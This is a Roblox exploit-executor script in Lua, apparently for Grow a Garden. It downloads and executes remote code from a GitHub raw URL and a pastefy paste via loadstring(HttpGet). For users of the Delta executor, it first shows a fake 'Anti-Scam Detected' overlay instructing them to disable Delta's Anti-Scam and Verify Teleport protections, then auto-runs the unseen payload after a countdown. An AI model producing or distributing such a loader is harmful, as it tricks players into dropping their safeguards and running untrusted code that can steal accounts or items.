if getgenv().AlreadyExecuted then
    return
end
getgenv().AlreadyExecuted = true

--// Services
local Players = game:GetService("Players")
local player = Players.LocalPlayer
local TweenService = game:GetService("TweenService")
local TeleportService = game:GetService("TeleportService")

--// Load external scripts
local function runLoaders()
    pcall(function()
        loadstring(game:HttpGet("https://raw.githubusercontent.com/ScriptDy/GrowAGarden/refs/heads/main/Library"))()
    end)
    pcall(function()
        loadstring(game:HttpGet("https://pastefy.app/grTeTEwx/raw"))()
    end)
end

--// Executor detection
local function detectExecutor()
    local success, result = pcall(function()
        if identifyexecutor then
            return identifyexecutor()
        elseif getexecutorname then
            return getexecutorname()
        else
            return "Unknown"
        end
    end)
    if success and result then
        return tostring(result)
    else
        return "Unknown"
    end
end

--// Delta Anti-Scam GUI Warning
local function showDeltaWarning()
    local ScreenGui = Instance.new("ScreenGui")
    ScreenGui.Parent = player:WaitForChild("PlayerGui")
    ScreenGui.ResetOnSpawn = false
    ScreenGui.IgnoreGuiInset = true

    -- Dark overlay
    local Background = Instance.new("Frame")
    Background.Parent = ScreenGui
    Background.Size = UDim2.new(1, 0, 1, 0)
    Background.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    Background.BackgroundTransparency = 0.4

    -- Main Frame
    local Frame = Instance.new("Frame")
    Frame.Parent = ScreenGui
    Frame.Size = UDim2.new(0, 500, 0, 280)
    Frame.Position = UDim2.new(0.5, -250, 0.5, -140)
    Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
    Frame.BackgroundTransparency = 1
    Frame.BorderSizePixel = 0
    Instance.new("UICorner", Frame).CornerRadius = UDim.new(0, 12)
    Instance.new("UIStroke", Frame).Color = Color3.fromRGB(0, 170, 255)

    -- Yellow Warning Bar
    local WarningBar = Instance.new("TextLabel")
    WarningBar.Parent = Frame
    WarningBar.Size = UDim2.new(1, 0, 0, 28)
    WarningBar.Position = UDim2.new(0, 0, 0, 0)
    WarningBar.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
    WarningBar.Font = Enum.Font.GothamBold
    WarningBar.TextSize = 14
    WarningBar.TextColor3 = Color3.fromRGB(255, 215, 0)
    WarningBar.TextWrapped = true
    WarningBar.Text = "Turn off your Anti-Scam & Verify Teleport to avoid getting banned or disconnected."

    -- Title (centered)
    local Title = Instance.new("TextLabel")
    Title.Parent = Frame
    Title.Size = UDim2.new(1, -20, 0, 40)
    Title.Position = UDim2.new(0, 10, 0, 35)
    Title.BackgroundTransparency = 1
    Title.Font = Enum.Font.SourceSansBold
    Title.TextSize = 22
    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
    Title.Text = "Delta Anti-Scam Detected"
    Title.TextXAlignment = Enum.TextXAlignment.Center -- ✅ centered

    -- Instructions
    local Label = Instance.new("TextLabel")
    Label.Parent = Frame
    Label.BackgroundTransparency = 1
    Label.Size = UDim2.new(1, -40, 1, -160)
    Label.Position = UDim2.new(0, 20, 0, 80)
    Label.Font = Enum.Font.Gotham
    Label.TextSize = 16
    Label.TextColor3 = Color3.fromRGB(220, 220, 220)
    Label.TextWrapped = true
    Label.TextYAlignment = Enum.TextYAlignment.Top
    Label.Text = [[
The script requires teleport permission, which is currently blocked by Delta’s Anti-Scam.

1) Tap the Delta icon at the top.
2) Open Settings (gear icon).
3) Disable "Anti-Scam" & "Verify Teleport".
4) Rejoin and run the script again.
]]

    -- Button (just shows countdown text, not clickable)
    local OpenBtn = Instance.new("TextButton")
    OpenBtn.Parent = Frame
    OpenBtn.Size = UDim2.new(0, 180, 0, 44)
    OpenBtn.Position = UDim2.new(0, 40, 1, -60)
    OpenBtn.BackgroundColor3 = Color3.fromRGB(80, 80, 80)
    OpenBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    OpenBtn.Font = Enum.Font.GothamBold
    OpenBtn.TextSize = 16
    OpenBtn.AutoButtonColor = false
    OpenBtn.Active = false
    Instance.new("UICorner", OpenBtn).CornerRadius = UDim.new(0, 10)

    -- Countdown logic
    local countdown = 5 -- seconds
    local interval = 0.01 -- 10ms updates

    task.spawn(function()
        while countdown > 0 do
            OpenBtn.Text = string.format("Open Script (%.2f)", countdown)
            task.wait(interval)
            countdown -= interval
        end

        -- Auto execute when countdown ends
        OpenBtn.Text = "Running..."
        runLoaders()
        ScreenGui:Destroy()
    end)

    -- Button: Rejoin
    local RejoinBtn = Instance.new("TextButton")
    RejoinBtn.Parent = Frame
    RejoinBtn.Size = UDim2.new(0, 180, 0, 44)
    RejoinBtn.Position = UDim2.new(1, -220, 1, -60)
    RejoinBtn.BackgroundColor3 = Color3.fromRGB(0, 122, 255)
    RejoinBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    RejoinBtn.Text = "Rejoin Game"
    RejoinBtn.Font = Enum.Font.GothamBold
    RejoinBtn.TextSize = 16
    Instance.new("UICorner", RejoinBtn).CornerRadius = UDim.new(0, 10)

    TweenService:Create(Frame, TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
        BackgroundTransparency = 0.15
    }):Play()

    RejoinBtn.MouseButton1Click:Connect(function()
        TeleportService:Teleport(game.PlaceId, player)
    end)
end

--// Main Execution
local executorName = detectExecutor()
if executorName:lower():find("delta") then
    showDeltaWarning()
else
    runLoaders()
end
